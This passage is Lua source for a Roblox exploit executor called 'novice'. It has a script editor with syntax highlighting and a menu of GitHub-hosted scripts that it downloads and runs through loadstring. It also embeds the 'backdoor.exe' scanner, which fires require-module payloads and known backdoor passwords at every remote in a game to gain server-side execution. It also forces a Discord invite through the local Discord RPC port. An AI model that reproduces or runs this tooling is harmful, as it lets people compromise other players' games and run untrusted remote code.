			"\"", "&quot;"),
			"'", "&apos;"
		)
	end

	local function SanitizeTabs(s: string): string
		return string.gsub(s, "\t", "    ")
	end

	local function SanitizeControl(s: string): string
		return string.gsub(s, "[\0\1\2\3\4\5\6\7\8\11\12\13\14\15\16\17\18\19\20\21\22\23\24\25\26\27\28\29\30\31]+", "")
	end

	local function highlight(textObject, src: string?, forceUpdate: boolean?)
		src = SanitizeTabs(SanitizeControl(src or textObject.Text))
		if forceUpdate ~= true and LastText[textObject] == src then
			return
		end
		LastText[textObject] = src

		textObject.RichText = false
		textObject.Text = src
		textObject.TextXAlignment = Enum.TextXAlignment.Left
		textObject.TextYAlignment = Enum.TextYAlignment.Top
		textObject.BackgroundColor3 = TokenColors.background
		textObject.TextColor3 = TokenColors.iden
		textObject.TextTransparency = 0.5

		local lineFolder = textObject:FindFirstChild("SyntaxHighlights")
		if not lineFolder then
			lineFolder = Instance.new("Folder")
			lineFolder.Name = "SyntaxHighlights"
			lineFolder.Parent = textObject
		end

		local _, numLines = string.gsub(src, "\n", "")
		numLines += 1

		local textHeight = textObject.TextSize

		local lineLabels = lineFolder:GetChildren()
		if not lineLabels then
			-- No existing lineLabels, create all new
			lineLabels = table.create(numLines)
			for i = 1, numLines do
				local position = (i * textHeight)
				if i == 1 then
					position = 0
				end
				local lineLabel = Instance.new("TextLabel")
				lineLabel.Name = "Line_" .. i
				lineLabel.RichText = true
				lineLabel.ZIndex = textObject.ZIndex + 1
				lineLabel.BackgroundTransparency = 1
				lineLabel.TextXAlignment = Enum.TextXAlignment.Left
				lineLabel.TextYAlignment = Enum.TextYAlignment.Top
				lineLabel.TextColor3 = TokenColors.iden
				lineLabel.Font = textObject.Font
				lineLabel.TextSize = textObject.TextSize
				lineLabel.Size = UDim2.new(1, 0, 0, math.ceil(textHeight))
				lineLabel.Position = UDim2.new(0,0,0,position)
				lineLabel.Text = ""

				lineLabel.Parent = lineFolder
				lineLabels[i] = lineLabel
			end
		else
			for i=1, math.max(numLines, #lineLabels) do
				local label = lineLabels[i]
				if not label then
					label = Instance.new("TextLabel")
					label.Name = "Line_" .. i
					label.RichText = true
					label.ZIndex = textObject.ZIndex + 1
					label.BackgroundTransparency = 1
					label.TextXAlignment = Enum.TextXAlignment.Left
					label.TextYAlignment = Enum.TextYAlignment.Top
					label.TextColor3 = TokenColors.iden
					label.Font = textObject.Font
					label.Parent = lineFolder
					lineLabels[i] = label
				end

				label.Text = ""
				label.TextSize = textObject.TextSize
				label.Size = UDim2.new(1, 0, 0, math.ceil(textHeight))
				label.Position = UDim2.fromScale(0, textHeight * (i - 1) / textObject.AbsoluteSize.Y)
			end
		end

		local richText, index, lineNumber = {}, 0, 1
		for token, content in Lexer().scan(src) do
			local Color = TokenColors[token] or TokenColors.iden

			local lines = string.split(SanitizeRichText(content), "\n")
			for l, line in ipairs(lines) do
				if l > 1 then
					-- Set line
					lineLabels[lineNumber].Text = table.concat(richText)
					-- Move to next line
					lineNumber += 1
					index = 0
					table.clear(richText)
				end

				index += 1
				if Color ~= TokenColors.iden and string.find(line, "[%S%C]") then
					richText[index] = string.format(TokenFormats[token], line)
				else
					richText[index] = line
				end
			end

		end
		local linesText = ""
		LuaLexer.CanvasSize = UDim2.new(1, 0, 1000, 0)
		if lineLabels then
			for i= 1,numLines do 
				LuaLexer.CanvasSize = LuaLexer.CanvasSize + UDim2.new(0, 0, 0, math.ceil(textHeight))
				linesText = linesText..i.."\n"
			end

		else 
			linesText = "1\n"
		end
		Lines.Text = linesText
		-- Set final line
		lineLabels[lineNumber].Text = table.concat(richText)

		ActiveLabels[textObject] = lineLabels


		local cleanup = Cleanups[textObject]
		if not cleanup then
			local connection

			cleanup = function()
				for _, label in ipairs(lineLabels) do
					label:Destroy()
				end
				table.clear(lineLabels)

				ActiveLabels[textObject] = nil
				LastText[textObject] = nil
				Cleanups[textObject] = nil

				if connection then
					connection:Disconnect()
				end
			end
			Cleanups[textObject] = cleanup

			connection = textObject.AncestryChanged:Connect(function()
				if textObject.Parent then
					return
				end
				cleanup()
			end)
		end

		return cleanup
	end

	export type HighlighterColors = {
		background: Color3?,
		iden: Color3?,
		keyword: Color3?,
		builtin: Color3?,
		string: Color3?,
		number: Color3?,
		comment: Color3?,
		operator: Color3?
	}

	local function updateColors(colors: HighlighterColors?)
		-- Setup color data
		TokenColors.background = (colors and colors.background) or Color3.fromRGB(47, 47, 47)
		TokenColors.iden = (colors and colors.iden) or Color3.fromRGB(234, 234, 234)
		TokenColors.keyword = (colors and colors.keyword) or Color3.fromRGB(215, 174, 255)
		TokenColors.builtin = (colors and colors.builtin) or Color3.fromRGB(131, 206, 255)
		TokenColors.string = (colors and colors.string) or Color3.fromRGB(196, 255, 193)
		TokenColors.number = (colors and colors.number) or Color3.fromRGB(255, 125, 125)
		TokenColors.comment = (colors and colors.comment) or Color3.fromRGB(140, 140, 155)
		TokenColors.operator = (colors and colors.operator) or Color3.fromRGB(255, 239, 148)

		for key, color in pairs(TokenColors) do
			TokenFormats[key] = '<font color="#'
				.. string.format("%.2x%.2x%.2x", color.R * 255, color.G * 255, color.B * 255)
				.. '">%s</font>'
		end

		-- Rehighlight existing labels using latest colors
		for label, lineLabels in pairs(ActiveLabels) do
			for _, lineLabel in ipairs(lineLabels) do
				lineLabel.TextColor3 = TokenColors.iden
			end
			highlight(label, label.Text, true)
		end
	end
	pcall(updateColors)

	return setmetatable({
		UpdateColors = updateColors,
		Highlight = highlight
	}, {
		__call = function(_, textObject: Instance, src: string?)
			return highlight(textObject, src)
		end
	})
end








-- Scripts:


local function ZEUSVK_fake_script() -- LuaLexer.LocalScript 
	wait(3)
	local textBox = Source

	textBox:GetPropertyChangedSignal("Text"):Connect(function()
		Highlighter().UpdateColors()
		Highlighter()(textBox,textBox.Text)
	end)
end
coroutine.wrap(ZEUSVK_fake_script)()


local startup = Instance.new("Sound",novice)
startup.SoundId =  "rbxassetid://3101925304"
startup.Name = "Startup"
local notify = Instance.new("Sound",novice)
notify.Name = "Notify"
notify.SoundId = "rbxassetid://5515669992"
local shutdown = Instance.new("Sound",novice)
shutdown.Name = "Shutdown"
shutdown.SoundId = "rbxassetid://3101925827"
local notify2 = Instance.new("Sound",novice)
notify2.Name = "Notify2"
notify2.SoundId = "rbxassetid://8183296024"
local errorSound = Instance.new("Sound",novice)
errorSound.Name = "ErrorSound"
errorSound.SoundId = "rbxassetid://8499261098"
local notify3 = Instance.new("Sound",novice)
notify3.Name = "Notify3"
notify3.SoundId = "rbxassetid://8503529943"
local notify4 = Instance.new("Sound",novice)
notify4.Name = "Notify4"
notify4.SoundId = "rbxassetid://8503529139"
local background = Instance.new("Sound",novice)
background.Name = "background"
background.SoundId = "rbxassetid://8503530582"
local function transition(custom : boolean, object, propretyTable, timer : number?)
	if custom then
		local tweenService = game:GetService("TweenService")
		local tweenInfo = TweenInfo.new(
			0.15,
			Enum.EasingStyle.Sine,
			Enum.EasingDirection.In
		)
		local tween  = tweenService:Create(object,tweenInfo,propretyTable)
		tween:Play()
	else 
		local tweenService = game:GetService("TweenService")
		local tweenInfo = TweenInfo.new(
			timer,
			Enum.EasingStyle.Sine,
			Enum.EasingDirection.In
		)

		local tween  = tweenService:Create(object,tweenInfo,propretyTable)
		tween:Play()
	end

end

Frame_2.Visible = false
TextLabel.Visible = false
Window.Visible = false
transition(true,Frame,{Transparency = 1, Size = UDim2.new(0, 564 - 50,0, 68 - 50),Position = UDim2.new(0.323, 0,-0.011, 0)},0.5)
task.wait(0.15)
startup:Play()
transition(false,Frame,{Transparency = 0, Size = UDim2.new(0, 564,0, 68 ),Position = UDim2.new(0.323, 0,-0.011, 0)},0.5)
Frame_2.Visible = true
TextLabel.Visible = true

Clear_2.MouseButton1Click:Connect(function()
	background:Play()
	pcall(loadstring(game:HttpGet("https://raw.githubusercontent.com/BruhMoment-s/novice-/main/nexoPD")))

end)
Clear.MouseButton1Click:Connect(function()
	Source.Text = ""
	notify4:Play()

end)
function mainLibrary()
	local lui = {}
	lui.backdoorMode = nil
	function lui.makeTabs(linkedFrame,image,imageRect,imageSize)
		local mainButton = Instance.new("TextButton")
		local buttonCorner = Instance.new("UICorner")
		local buttonPadding = Instance.new("UIPadding")
		local mainImage = Instance.new("ImageLabel")
		if typeof(linkedFrame) ~= "string"  then
			mainButton.Name = linkedFrame.Name
		else 
			mainButton.Name = linkedFrame
		end
		mainButton.Parent = Frame_2
		mainButton.BackgroundColor3 = Color3.fromRGB(55, 55, 55)
		mainButton.Position = UDim2.new(0.248826295, 0, 0.141818196, 0)
		mainButton.Size = UDim2.new(0, 35, 0, 35)
		mainButton.Text = ""
		mainButton.AutoButtonColor = false
		mainButton.Transparency = 1

		buttonCorner.Parent = mainButton

		buttonPadding.Parent = mainButton
		buttonPadding.PaddingBottom = UDim.new(0, 5)
		buttonPadding.PaddingLeft = UDim.new(0, 5)
		buttonPadding.PaddingRight = UDim.new(0, 5)
		buttonPadding.PaddingTop = UDim.new(0, 5)

		mainImage.Name = "menuList"
		mainImage.Parent = mainButton
		mainImage.Active = true
		mainImage.BackgroundTransparency = 1.000
		mainImage.LayoutOrder = 5
		mainImage.Selectable = true
		mainImage.Size = UDim2.new(1, 0, 1, 0)
		mainImage.ZIndex = 2
		mainImage.Image = image
		mainImage.ImageColor3 = Color3.fromRGB(194, 194, 194)
		mainImage.ImageRectOffset = imageRect
		mainImage.ImageRectSize = imageSize
		mainImage.ImageTransparency = 1



		transition(false,mainButton,{Transparency = 0},0.5)
		transition(false,mainImage,{ImageTransparency = 0},0.5)
		local isVisible = false
		mainButton.MouseButton1Click:Connect(function()

			if linkedFrame == "Exit" then 
				shutdown:Play()
				task.wait(1.8)
				if lui.backdoorMode then
					background.Parent.Parent:Destroy()
				end
				game.CoreGui["novice+"]:Destroy() end

			if mainButton.BackgroundColor3 == Color3.fromRGB(55,55,55) then
				isVisible = false
			else 
				isVisible = true
			end
			if not isVisible then
				errorSound:Play()
				transition(true,mainButton,{BackgroundColor3 = Color3.fromRGB(194,194,194)})
				transition(true,mainImage,{ImageColor3 = Color3.fromRGB(55,55,55)})

			else 

				transition(true,mainButton,{BackgroundColor3 = Color3.fromRGB(55,55,55)})
				transition(true,mainImage,{ImageColor3 = Color3.fromRGB(194,194,194)})
				notify3:Play()
			end
			for i,v in pairs(Frame_2:GetChildren()) do
				if v:IsA("TextButton") and v.Name ~= mainButton.Name then
					transition(true,v,{BackgroundColor3 = Color3.fromRGB(55,55,55)})
					transition(true,v.menuList,{ImageColor3 = Color3.fromRGB(194,194,194)})
				end
			end
			for i,v in pairs(Window:GetChildren()) do
				if v:IsA("Frame") then
					v.Visible = false
				end
			end

			isVisible = not isVisible
			transition(true,Window,{Transparency = 1, Size = UDim2.new(0.953, 0,3.559, 0),Position = UDim2.new(0.023, 0,0.985, 10)})
			task.wait(0.15)
			Window.Visible = isVisible
			transition(false,Window,{Transparency = 0, Size = UDim2.new(1,0,3.735, 0),Position = UDim2.new(0,0,1,10)},0.5)
			task.wait(0.5 - 0.1)

			linkedFrame.Visible = isVisible
		end)

	end
	function lui.executorScripts(link : string,name)
		local Template = Instance.new("Frame")
		local UIGradient_3 = Instance.new("UIGradient")
		local UICorner_9 = Instance.new("UICorner")
		local itemName = Instance.new("TextLabel")
		local ItemDesc = Instance.new("TextLabel")
		local View = Instance.new("TextButton")
		local Execute = Instance.new("TextButton")

		Template.Name = name
		Template.Parent = ScrollingFrame
		Template.BackgroundColor3 = Color3.fromRGB(255, 138, 60)
		Template.Size = UDim2.new(0.95, 15, 0, 75)

		UIGradient_3.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(152, 152, 152))}
		UIGradient_3.Rotation = 180
		UIGradient_3.Parent = Template

		UICorner_9.Parent = Template

		itemName.Name = "itemName"
		itemName.Parent = Template
		itemName.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		itemName.BackgroundTransparency = 1.000
		itemName.Size = UDim2.new(0, 215, 0, 57)
		itemName.Font = Enum.Font.GothamMedium
		itemName.Text = name
		itemName.TextColor3 = Color3.fromRGB(194, 194, 194)
		itemName.TextSize = 14.000


		local isPaid = false
		local textCost = "Free"
		if string.find(name,"PAID") then
			isPaid = true
			textCost = "Paid"
		end
		if string.find(name,"BUGGY") then
			textCost = "BUGGY"
		end

		ItemDesc.Name = "ItemDesc"
		ItemDesc.Parent = Template
		ItemDesc.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		ItemDesc.BackgroundTransparency = 1.000
		ItemDesc.Position = UDim2.new(0, 0, 0.239999995, 0)
		ItemDesc.Size = UDim2.new(0, 215, 0, 57)
		ItemDesc.Font = Enum.Font.GothamMedium
		ItemDesc.Text = "Free"
		ItemDesc.TextColor3 = Color3.fromRGB(194, 194, 194)
		ItemDesc.TextSize = 14.000

		View.Name = "View"
		View.Parent = Template
		View.Active = false
		View.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		View.BackgroundTransparency = 1.000
		View.Position = UDim2.new(0.605490804, 0, 0.119999997, 0)
		View.Selectable = false
		View.Size = UDim2.new(0, 104, 0, 57)
		View.Font = Enum.Font.GothamMedium
		View.Text = "View"
		View.TextColor3 = Color3.fromRGB(194, 194, 194)
		View.TextSize = 25.000

		Execute.Name = "Execute"
		Execute.Parent = Template
		Execute.Active = false
		Execute.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		Execute.BackgroundTransparency = 1.000
		Execute.Position = UDim2.new(0.801053047, 0, 0.119999997, 0)
		Execute.Selectable = false
		Execute.Size = UDim2.new(0, 91, 0, 57)
		Execute.Font = Enum.Font.GothamMedium
		Execute.Text = "Execute"
		Execute.TextColor3 = Color3.fromRGB(194, 194, 194)
		Execute.TextSize = 25.000



		local rand = Random.new()

		local function randomColor()
			return Color3.new(rand:NextNumber(), rand:NextNumber(),
				rand:NextNumber())
		end
		Template.BackgroundColor3 = randomColor()
		View.MouseButton1Click:Connect(function()
			notify2:Play()
			Source.Text = game:HttpGet(link)
			transition(true,Frame_2.Executer,{BackgroundColor3 = Color3.fromRGB(194,194,194)})
			transition(true,Frame_2.Executer.menuList,{ImageColor3 = Color3.fromRGB(55,55,55)})
			for i,v in pairs(Frame_2:GetChildren()) do
				if v:IsA("TextButton") and v.Name ~= "Executer" then
					transition(true,v,{BackgroundColor3 = Color3.fromRGB(55,55,55)})
					transition(true,v.menuList,{ImageColor3 = Color3.fromRGB(194,194,194)})
				end
			end
			for i,v in pairs(Window:GetChildren()) do
				if v:IsA("Frame") then
					v.Visible = false
				end
			end


			transition(true,Window,{Transparency = 1, Size = UDim2.new(0.953, 0,3.559, 0),Position = UDim2.new(0.023, 0,0.985, 10)})
			task.wait(0.15)
			Window.Visible = true
			transition(false,Window,{Transparency = 0, Size = UDim2.new(1,0,3.735, 0),Position = UDim2.new(0,0,1,10)},0.5)
			task.wait(0.5 - 0.1)
			Executer.Visible = true

		end)
		Execute.MouseButton1Click:Connect(function()
			notify3:Play()
			if lui.backdoorMode then
				local callback = game:HttpGet(link):format(game.Players.LocalPlayer.Name)
				local remote = lui.backdoorMode

				remote:FireServer(callback)
			else 

				pcall(
					loadstring(game:HttpGet(link))
				)
			end
		end)

	end

	return lui
end

----------/////// CUSTOM NOVICE
local mainlib  =  mainLibrary()
mainlib.makeTabs(Attacher,"rbxassetid://6764432408",Vector2.new(200,350),Vector2.new(50,50))
mainlib.makeTabs(Executer,"rbxassetid://6764432408",Vector2.new(100,150),Vector2.new(50,50))


FE.MouseButton1Click:Connect(function()
	shutdown:Play()
	TextLabel.Text = "Novice FE"
	mainlib.makeTabs(Scritps,"rbxassetid://6764432408",Vector2.new(150,0),Vector2.new(50,50))

	transition(false,Frame_2.Attacher,{Transparency = 1},0.5)
	transition(false,Frame_2.Attacher.menuList,{ImageTransparency = 1},0.5)
	task.wait(0.475)
	Frame_2.Attacher:Destroy()
	local executorList = {
		["https://raw.githubusercontent.com/BruhMoment-s/novice-/main/FE%20scripts/FE%20Amogus"] = "FE Amogus",
		["https://raw.githubusercontent.com/BruhMoment-s/novice-/main/FE%20scripts/FE%20Best%20Friend"] = "FE Best Friend",
		["https://raw.githubusercontent.com/BruhMoment-s/novice-/main/FE%20scripts/FE%20Bike"] = "FE Bike",
		["https://raw.githubusercontent.com/BruhMoment-s/novice-/main/FE%20scripts/FE%20Billy"] = "FE Billy",
		["https://raw.githubusercontent.com/BruhMoment-s/novice-/main/FE%20scripts/FE%20Budget%20soldier"] = "FE Budget Soldier",
		["https://raw.githubusercontent.com/BruhMoment-s/novice-/main/FE%20scripts/FE%20Creepy%20Crawler"] = "FE Creepy Crawler",
		["https://raw.githubusercontent.com/BruhMoment-s/novice-/main/FE%20scripts/FE%20Dolle"] = "FE Doll",
		["https://raw.githubusercontent.com/BruhMoment-s/novice-/main/FE%20scripts/FE%20Floppa"] = "FE Floppa",
		["https://raw.githubusercontent.com/BruhMoment-s/novice-/main/FE%20scripts/FE%20Football"] = "FE Football",
		["https://raw.githubusercontent.com/BruhMoment-s/novice-/main/FE%20scripts/FE%20Guts"] = "FE Guts",
		["https://raw.githubusercontent.com/BruhMoment-s/novice-/main/FE%20scripts/FE%20Head%20Pet"] = "FE Head Pet",
		["https://raw.githubusercontent.com/BruhMoment-s/novice-/main/FE%20scripts/FE%20Hoverboard"] = "FE Hoverboard",
		["https://raw.githubusercontent.com/BruhMoment-s/novice-/main/FE%20scripts/FE%20Jackson%20Hammer"] = "FE Jackson Hammer",
		["https://raw.githubusercontent.com/BruhMoment-s/novice-/main/FE%20scripts/FE%20Neptune%20V"] = "FE Neptune V",
		["https://raw.githubusercontent.com/BruhMoment-s/novice-/main/FE%20scripts/FE%20Pickaxe"] = "FE Pickaxe",
		["https://raw.githubusercontent.com/BruhMoment-s/novice-/main/FE%20scripts/FE%20Player%20ball%20controls"] = "FE Ball Controls",
		["https://raw.githubusercontent.com/BruhMoment-s/novice-/blob/main/FE%20scripts/FE%20Railgun"] = "FE Railgun",
		["https://raw.githubusercontent.com/BruhMoment-s/novice-/main/FE%20scripts/FE%20Spectrum%20Glitcher"] = "FE Spectrum Glitcher",
		["https://raw.githubusercontent.com/BruhMoment-s/novice-/main/FE%20scripts/FE%20Stand"] = "FE Stand",
		["https://raw.githubusercontent.com/BruhMoment-s/novice-/main/FE%20scripts/FE%20fatherless"] = "FE Fatherless",
		["https://raw.githubusercontent.com/BruhMoment-s/novice-/main/FE%20scripts/FE%20zombie"] = "FE Zombie",
		["https://raw.githubusercontent.com/BruhMoment-s/novice-/main/FE%20scripts/PAID%20FE%20Minigun"] = "[PAID] FE Minigun",
		["https://raw.githubusercontent.com/BruhMoment-s/novice-/main/FE%20scripts/%5BBUGGY%5D%20FE%20Rb%20Neptunian"] = "[BUGGY] FE RB Neptunian",
		["https://raw.githubusercontent.com/BruhMoment-s/novice-/main/FE%20scripts/%5BBUGGY%5D%20FE%20Spiderman"] = "[BUGGY] FE Spiderman",
		["https://raw.githubusercontent.com/BruhMoment-s/novice-/main/FE%20scripts/%5BPAID%5D%20FE%20Combine%20Soldier"] = "[PAID] FE Combine",
		["https://raw.githubusercontent.com/BruhMoment-s/novice-/main/FE%20scripts/%5BPAID%5D%20FE%20Eye%20Head"] = "[PAID] FE Eye Head",
		["https://raw.githubusercontent.com/BruhMoment-s/novice-/main/FE%20scripts/%5BPAID%5D%20FE%20Ghost%20Rider"] = "[PAID] FE Ghost Rider",
		["https://raw.githubusercontent.com/BruhMoment-s/novice-/main/FE%20scripts/%5BPAID%5D%20FE%20Giant"] = "[PAID] FE Giant",
		["https://raw.githubusercontent.com/BruhMoment-s/novice-/main/FE%20scripts/%5BPAID%5D%20FE%20Shotgun"] = "[PAID] FE Shotgun",
		["https://raw.githubusercontent.com/BruhMoment-s/novice-/main/FE%20scripts/%5BPAID%5D%20FE%20Showcase%20dummy"] = "[PAID] FE Showcase Dummy",
		["https://raw.githubusercontent.com/BruhMoment-s/novice-/main/FE%20scripts/%5BPAID%5D%20FE%20Soldier%20AI"] = "[PAID] FE Soldier AI",
		["https://raw.githubusercontent.com/BruhMoment-s/novice-/main/FE%20scripts/%5BPAID%5D%20FE%20Tornado"] = "[PAID] FE Tornado",
		["https://raw.githubusercontent.com/BruhMoment-s/novice-/main/FE%20scripts/%5BPAID%7CFREE%5D%20FE%20Skateboard"] = "[PAID|FREE] FE Skateboard",
		["https://raw.githubusercontent.com/BruhMoment-s/novice-/main/FE%20scripts/FE%20Kinetic%20Gun"] = "FE Kinetic Gun",
		["https://raw.githubusercontent.com/BruhMoment-s/novice-/main/FE%20scripts/FE%20Giant%20M40%20Gun"] = "FE Giant M40 Gun",
		["https://raw.githubusercontent.com/BruhMoment-s/novice-/main/FE%20scripts/FE%20Winged%20Master"] = "FE Winged Master",
		["https://raw.githubusercontent.com/BruhMoment-s/novice-/main/FE%20scripts/FE%20Telekinesis%20V2"] = "FE Telekinesis V2",
		["https://raw.githubusercontent.com/BruhMoment-s/novice-/main/FE%20scripts/FE%20Nullioner"] = "FE Nullioner",
		["https://raw.githubusercontent.com/BruhMoment-s/novice-/main/FE%20scripts/FE%20Resize"] = "FE Resize",
		["https://raw.githubusercontent.com/BruhMoment-s/novice-/main/FE%20scripts/FE%20Achromatic"] = "FE Achromatic",
		["https://raw.githubusercontent.com/BruhMoment-s/novice-/main/FE%20scripts/FE%20Gravity%20Contorl"] = "FE Gravity Control",
	}
	for i,v in pairs(executorList) do 
		mainlib.executorScripts(i,v)
	end

	mainlib.makeTabs("Exit","rbxassetid://6764432408",Vector2.new(100, 400),Vector2.new(50,50))

	transition(true,Frame_2.Executer,{BackgroundColor3 = Color3.fromRGB(194,194,194)})
	transition(true,Frame_2.Executer.menuList,{ImageColor3 = Color3.fromRGB(55,55,55)})
	for i,v in pairs(Frame_2:GetChildren()) do
		if v:IsA("TextButton") and v.Name ~= "Executer" then
			transition(true,v,{BackgroundColor3 = Color3.fromRGB(55,55,55)})
			transition(true,v.menuList,{ImageColor3 = Color3.fromRGB(194,194,194)})
		end
	end
	for i,v in pairs(Window:GetChildren()) do
		if v:IsA("Frame") then
			v.Visible = false
		end
	end


	transition(true,Window,{Transparency = 1, Size = UDim2.new(0.953, 0,3.559, 0),Position = UDim2.new(0.023, 0,0.985, 10)})
	task.wait(0.15)
	Window.Visible = true
	transition(false,Window,{Transparency = 0, Size = UDim2.new(1,0,3.735, 0),Position = UDim2.new(0,0,1,10)},0.5)
	task.wait(0.5 - 0.1)
	Executer.Visible = true
end)
Classic.MouseButton1Click:Connect(function()
	shutdown:Play()
	TextLabel.Text = "Novice Classic"

	transition(false,Frame_2.Attacher,{Transparency = 1},0.5)
	transition(false,Frame_2.Attacher.menuList,{ImageTransparency = 1},0.5)
	task.wait(0.475)
	Frame_2.Attacher:Destroy()
	mainlib.makeTabs(Scritps,"rbxassetid://6764432408",Vector2.new(150,0),Vector2.new(50,50))
	local executorList = {

	}
	for i,v in pairs(executorList) do 
		mainlib.executorScripts(i,v)
	end

	mainlib.makeTabs("Exit","rbxassetid://6764432408",Vector2.new(100, 400),Vector2.new(50,50))

	transition(true,Frame_2.Executer,{BackgroundColor3 = Color3.fromRGB(194,194,194)})
	transition(true,Frame_2.Executer.menuList,{ImageColor3 = Color3.fromRGB(55,55,55)})
	for i,v in pairs(Frame_2:GetChildren()) do
		if v:IsA("TextButton") and v.Name ~= "Executer" then
			transition(true,v,{BackgroundColor3 = Color3.fromRGB(55,55,55)})
			transition(true,v.menuList,{ImageColor3 = Color3.fromRGB(194,194,194)})
		end
	end
	for i,v in pairs(Window:GetChildren()) do
		if v:IsA("Frame") then
			v.Visible = false
		end
	end


	transition(true,Window,{Transparency = 1, Size = UDim2.new(0.953, 0,3.559, 0),Position = UDim2.new(0.023, 0,0.985, 10)})
	task.wait(0.15)
	Window.Visible = true
	transition(false,Window,{Transparency = 0, Size = UDim2.new(1,0,3.735, 0),Position = UDim2.new(0,0,1,10)},0.5)
	task.wait(0.5 - 0.1)
	Executer.Visible = true
end)
Run_2.MouseButton1Click:Connect(function()
	local callback = Source.Text
	local callback = callback or function() end

	if mainlib.backdoorMode then
		local callback = callback:format(game.Players.LocalPlayer.Name)
		local remote = mainlib.backdoorMode

		remote:FireServer(callback)
	else 

		pcall(loadstring(callback))
	end
end)


function attachRevamped()
--[[
    backdoor.exe, the best backdoor scanner in Roblox.
    Copyright (C) 2021	iK4oS

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
]]

	local dateTimeNow = DateTime.now
	local tableFind = table.find
	local taskSpawn = task.spawn
	local taskWait = task.wait
	local stringRep = string.rep

	local RobloxReplicatedStorage = game:GetService("RobloxReplicatedStorage")
	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local JointsService = game:GetService("JointsService")
	local StarterGui = game:GetService("StarterGui")

	local LocalPlayer = game:GetService("Players").LocalPlayer
	local requireScript = ("require(9982941173).k4scripts('%s', %s) -- "):format(LocalPlayer.Name, "true", string.rep("!", 2400)) -- set true to false to disable logging, we add a filler so that the backdoor code won't be send to the chat, by default, only message with 200 characters (or 1,200 bytes) can be send, we multipy it by 2 to be safe.
	local invCode = "4tRadfjY69"

	local alternativeSS = {
		run = { [1] = "5#lGIERKWEF" },
		emma = { [1] = "pwojr8hoc0-gr0yxohlgp-0feb7ncxed", [2] = ",,,,,,,,,,,,,,," },
		helpme = { [1] = "helpme" },
		pickett = { [1] = "cGlja2V0dA==" },
		harked = "https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/harkedSS.lua"
	}

	local function notify(text)
		StarterGui:SetCore(
			"SendNotification",
			{
				Title = "novice.exe",
				Duration = 3,
				Text = text
			}
		)
	end

	local function attached(possibleWait)
		local PlayerGui =  LocalPlayer.PlayerGui

		if possibleWait then
			local start = dateTimeNow().UnixTimestampMillis
			local possibleWait = possibleWait * 1000
			while PlayerGui and not PlayerGui:FindFirstChild("novice.exe") and (possibleWait > dateTimeNow().UnixTimestampMillis - start) do
				taskWait()
			end
		end

		return PlayerGui and PlayerGui:FindFirstChild("novice.exe")
	end

	local function validRemote(rm)
		local Parent = rm.Parent

		if getgenv().blacklisted then
			if tableFind(getgenv().blacklisted, rm:GetFullName()) then return false end
		end

		if Parent then
			if Parent == JointsService then return false end

			-- Addonis Check
			if (Parent == ReplicatedStorage and rm:FindFirstChild("__FUNCTION")) or
				(rm.Name == "__FUNCTION" and Parent.ClassName == "RemoteEvent" and Parent.Parent == ReplicatedStorage) then return false end

			-- 		if (Parent.ClassName == "Folder" and Parent.Name == "DefaultChatSystemChatEvents" and Parent.Parent == ReplicatedStorage) then return false end
		end

		if rm:IsDescendantOf(RobloxReplicatedStorage) then return false end

		return true
	end

	local function harked()
		local backpack = LocalPlayer.Backpack 
		return backpack:FindFirstChild("HandlessSegway") and
			backpack.HandlessSegway:FindFirstChild("RemoteEvents") and
			backpack.HandlessSegway.RemoteEvents:FindFirstChild("DestroySegway")
	end
	local function emmaBackdoor(rm)
		local Parent = rm.Parent
		return rm.Name == "emma" and Parent and Parent.Name == "mynameemma" and Parent.Parent == ReplicatedStorage
	end

	local function runBackdoor(rm)
		local Parent = rm.Parent
		return rm.Name == "Run" and Parent and
			Parent:FindFirstChild("Pages") and Parent:FindFirstChild("R6") and
			Parent:FindFirstChild("Version") and Parent:FindFirstChild("Title")
	end

	local function httpRequest(url)
		if syn and syn.request then return syn.request({Url=url}).Body
		elseif request then return request({Url=url}).Body
		else return game:HttpGetAsync(url) end
	end

	local function scanGame()
		notify("Scanning for a backdoor.")

		if harked() then
			loadstring(httpRequest(alternativeSS.harked))()
			return
		end

		do
			local DescendantsList = game:GetDescendants()
			for index=1, #DescendantsList do
				if attached() then break end
				local remote = DescendantsList[index]

				if not validRemote(remote) then continue end
				if remote.ClassName ~= "RemoteEvent" then continue end

				if emmaBackdoor(remote) then
					remote:FireServer(unpack(alternativeSS.emma), requireScript)
				end
				if not attached() and runBackdoor(remote) then
					remote:FireServer(unpack(alternativeSS.run), requireScript)
				end

				if not attached() then remote:FireServer(unpack(alternativeSS.helpme), requireScript) end
				if not attached() then remote:FireServer(unpack(alternativeSS.pickett), requireScript) end
				if not attached() then remote:FireServer(requireScript) end

			end
			if attached() then return end

			for index=1, #DescendantsList do
				if attached() then break end
				local remote = DescendantsList[index]

				if not validRemote(remote) then continue end
				if remote.ClassName ~= "RemoteFunction" then continue end

				local waiting = true
				taskSpawn(function()
					remote:InvokeServer(requireScript)
					waiting = nil
				end)

				-- If RemoteFunction don't respond in 1 second, we skip this one.
				local start = dateTimeNow().UnixTimestampMillis
				while waiting and 1000 > dateTimeNow().UnixTimestampMillis - start do
					taskWait()
				end

			end
		end
	end

	local function Main()
		local function promtDicordInvite()
			local httpService = game:GetService("HttpService")
			local httpRequest = (syn and syn.request) or (httpService and httpService.request) or (http_request)

			if not httpRequest then print("Exploit not supported. No HTTP found.") return end

			httpRequest({
				Url = "http://127.0.0.1:6463/rpc?v=1",
				Method = "POST",

				Headers = {
					['Content-Type'] = 'application/json',
					Origin = 'https://discord.com'
				},

				Body = httpService:JSONEncode({
					cmd = 'INVITE_BROWSER',
					nonce = httpService:GenerateGUID(false),
					args = {code = invCode}
				})
			})
		end
		local Bindable = Instance.new("BindableFunction")
		Bindable.OnInvoke = promtDicordInvite
		

		scanGame()

